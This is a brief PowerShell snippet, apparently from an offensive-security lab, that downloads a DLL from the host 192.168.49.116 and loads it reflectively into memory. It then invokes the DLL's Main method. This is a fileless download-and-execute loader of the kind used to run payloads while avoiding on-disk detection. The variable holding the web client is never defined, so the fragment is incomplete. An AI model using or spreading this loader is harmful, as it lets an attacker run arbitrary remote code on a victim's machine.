$data = $wc.DownloadData('http://192.168.49.116/main.dll');
$assembly = [System.Reflection.Assembly]::Load($data);

$class = $assembly.GetType('main')
$method = $class.GetMethod('Main')
$method.Invoke(0, $null);